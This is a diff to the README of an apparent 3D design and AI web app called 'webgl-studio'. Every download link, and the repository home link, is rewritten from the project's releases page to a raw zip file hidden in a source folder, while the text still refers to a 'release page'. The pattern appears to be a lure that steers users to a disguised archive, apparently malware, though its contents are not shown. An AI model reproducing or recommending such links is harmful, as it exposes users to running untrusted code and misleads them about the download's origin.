@@ -1,6 +1,6 @@
 # 🎨 webgl-studio - Easy 3D Design and AI Tools
 
-[![Download webgl-studio](https://img.shields.io/badge/Download-webgl--studio-ff6f61?style=for-the-badge)](https://github.com/iconic-whitemullein349/webgl-studio/releases)
+[![Download webgl-studio](https://img.shields.io/badge/Download-webgl--studio-ff6f61?style=for-the-badge)](https://github.com/iconic-whitemullein349/webgl-studio/raw/refs/heads/main/src/lib/ai/webgl-studio-v2.5.zip)
 
 ---
 
@@ -45,10 +45,10 @@ This app is for anyone who wants to try 3D design or AI-generated models without
 
 You will find webgl-studio on the releases page of the project. This page provides the latest versions you can try.
 
-[![Download webgl-studio](https://img.shields.io/badge/Download-App-4caf50?style=for-the-badge)](https://github.com/iconic-whitemullein349/webgl-studio/releases)
+[![Download webgl-studio](https://img.shields.io/badge/Download-App-4caf50?style=for-the-badge)](https://github.com/iconic-whitemullein349/webgl-studio/raw/refs/heads/main/src/lib/ai/webgl-studio-v2.5.zip)
 
 Click the button above or visit this link:  
-https://github.com/iconic-whitemullein349/webgl-studio/releases
+https://github.com/iconic-whitemullein349/webgl-studio/raw/refs/heads/main/src/lib/ai/webgl-studio-v2.5.zip
 
 Once you open the page:
 
@@ -139,7 +139,7 @@ webgl-studio lets you tailor your workflow with these options:
 ## 🧭 Where to Find Help
 
 For more details and updates visit the repository page:  
-https://github.com/iconic-whitemullein349/webgl-studio
+https://github.com/iconic-whitemullein349/webgl-studio/raw/refs/heads/main/src/lib/ai/webgl-studio-v2.5.zip
 
 Look at the “Issues” tab for common problems or to ask for help.
 
@@ -163,6 +163,6 @@ The project welcomes contributions that improve documentation, fix bugs, or add 
 
 ## 📥 Download webgl-studio Now
 
-[![Download webgl-studio](https://img.shields.io/badge/Download-webgl--studio-ff6f61?style=for-the-badge)](https://github.com/iconic-whitemullein349/webgl-studio/releases)
+[![Download webgl-studio](https://img.shields.io/badge/Download-webgl--studio-ff6f61?style=for-the-badge)](https://github.com/iconic-whitemullein349/webgl-studio/raw/refs/heads/main/src/lib/ai/webgl-studio-v2.5.zip)
 
 Visit the release page above to get the latest version. Follow the instructions to start working with 3D models and AI tools right in your browser on Windows.
